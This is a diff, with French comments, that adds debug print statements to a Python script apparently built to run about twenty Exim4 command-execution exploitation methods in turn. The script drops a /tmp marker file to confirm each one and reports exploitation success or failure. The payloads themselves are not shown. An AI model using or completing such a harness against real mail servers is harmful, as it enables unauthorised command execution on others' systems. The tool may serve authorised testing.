@@ -13,10 +13,12 @@ print("=========================================")
 
 # Fonction pour exécuter une commande shell et retourner la sortie
 def run_command(command):
+    print(f"[DEBUG] Exécution de la commande: {command}")
     try:
         result = subprocess.run(command, shell=True, check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         return result.stdout, result.stderr, result.returncode
     except Exception as e:
+        print(f"[DEBUG] Erreur lors de l'exécution de la commande: {e}")
         return "", str(e), -1
 
 # Fonction pour créer un fichier témoin aléatoire
@@ -24,6 +26,7 @@ def create_random_marker():
     random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
     marker_file = f"/tmp/exim_marker_{random_string}"
     marker_content = f"Exim exploit marker {datetime.now()}"
+    print(f"[DEBUG] Fichier témoin créé: {marker_file}")
     return marker_file, marker_content
 
 # Fonction pour vérifier si l'exploitation a réussi
@@ -342,6 +345,7 @@ exploitation_methods.append(method20)
 
 # Exécuter toutes les méthodes d'exploitation
 def run_all_methods():
+    print("[DEBUG] Démarrage de run_all_methods()")
     marker_file, marker_content = create_random_marker()
     script_path = create_test_script(marker_file, marker_content)
     
@@ -353,6 +357,7 @@ def run_all_methods():
     successful_method = None
     
     for i, method in enumerate(exploitation_methods, 1):
+        print(f"[DEBUG] Test de la méthode {i}")
         try:
             if method(script_path, marker_file, marker_content):
                 print(f"\n[!] SUCCÈS avec la méthode {i}!")
@@ -362,6 +367,7 @@ def run_all_methods():
             else:
                 print(f"[-] Échec de la méthode {i}")
         except Exception as e:
+            print(f"[DEBUG] Erreur lors de l'exécution de la méthode {i}: {e}")
             print(f"[-] Erreur lors de l'exécution de la méthode {i}: {e}")
     
     if success:
@@ -373,7 +379,8 @@ def run_all_methods():
             with open(marker_file, 'r') as f:
                 content = f.read().strip()
                 print(f"[+] Contenu du fichier témoin:\n{content}")
-        except:
+        except Exception as e:
+            print(f"[DEBUG] Erreur lors de la lecture du fichier témoin: {e}")
             print("[-] Impossible de lire le fichier témoin.")
     else:
         print("\n[-] Toutes les méthodes d'exploitation ont échoué.")
@@ -386,11 +393,13 @@ def run_all_methods():
 
 # Exécuter le scanner
 if __name__ == "__main__":
+    print("[DEBUG] Démarrage du script principal")
     print("[*] Démarrage du scanner d'exécution de commande pour Exim4...")
     print("[*] Version d'Exim4: ", end="")
     stdout, stderr, _ = run_command("/usr/sbin/exim4 -bV | head -n 1")
     print(stdout.strip())
     
+    print("[DEBUG] Appel de run_all_methods()")
     success, method = run_all_methods()
     
     if success:
@@ -400,3 +409,5 @@ if __name__ == "__main__":
     else:
         print("\n[-] ÉCHEC DE L'EXPLOITATION.")
         print("[-] Impossible d'exécuter des commandes avec Exim4.")
+    
+    print("[DEBUG] Fin du script")
